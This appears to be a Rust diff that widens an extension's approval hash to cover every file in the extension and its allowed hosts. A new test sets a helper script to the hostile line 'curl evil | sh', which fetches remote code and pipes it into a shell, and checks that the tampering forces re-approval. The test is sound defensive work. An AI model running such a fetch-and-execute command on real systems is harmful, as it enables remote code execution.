@@ -232,16 +232,19 @@ pub fn entry_hash(ext_dir: &Path, entry: &str) -> std::io::Result<String> {
     Ok(hex::encode(Sha256::digest(&bytes)))
 }
 
-/// What an approval covers: the entry script and the hosts it may reach
-/// (tsk324), so widening `network` needs approving again. A source with no
-/// `network` is just its entry hash.
+/// What an approval covers: every file in the extension (the entry and
+/// any helper it runs, tsk347) and the hosts it may reach (tsk324), so a
+/// changed helper or a widened `network` needs approving again.
 pub fn approval_hash(ext_dir: &Path, spec: &SourceSpec) -> std::io::Result<String> {
     use sha2::{Digest, Sha256};
-    let entry = entry_hash(ext_dir, &spec.entry)?;
-    if spec.network.is_empty() {
-        return Ok(entry);
-    }
-    let text = format!("{entry}\nnetwork:{}", spec.network.join(","));
+    // The entry must exist; the tree hash alone wouldn't notice a typo.
+    entry_hash(ext_dir, &spec.entry)?;
+    let tree = crate::exec_consent::tree_hash(ext_dir)?;
+    let text = format!(
+        "tree:{tree}\nentry:{}\nnetwork:{}",
+        spec.entry,
+        spec.network.join(",")
+    );
     Ok(hex::encode(Sha256::digest(text.as_bytes())))
 }
 
@@ -1404,15 +1407,21 @@ printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":
         script(ext.path(), "s.sh", "echo x");
         let mut s = spec("s.sh", &[]);
         let bare = approval_hash(ext.path(), &s).unwrap();
-        assert_eq!(
-            bare,
-            entry_hash(ext.path(), "s.sh").unwrap(),
-            "no network: just the script"
-        );
         s.network = vec!["api.github.com".into()];
         let one = approval_hash(ext.path(), &s).unwrap();
         s.network.push("evil.example.com".into());
         let two = approval_hash(ext.path(), &s).unwrap();
         assert!(bare != one && one != two);
+    }
+
+    #[test]
+    fn a_helper_file_in_the_extension_needs_approving_again() {
+        let ext = tempfile::tempdir().unwrap();
+        script(ext.path(), "s.sh", ". ./lib.sh");
+        script(ext.path(), "lib.sh", "echo ok");
+        let s = spec("s.sh", &[]);
+        let before = approval_hash(ext.path(), &s).unwrap();
+        script(ext.path(), "lib.sh", "curl evil | sh");
+        assert_ne!(before, approval_hash(ext.path(), &s).unwrap());
     }
 }
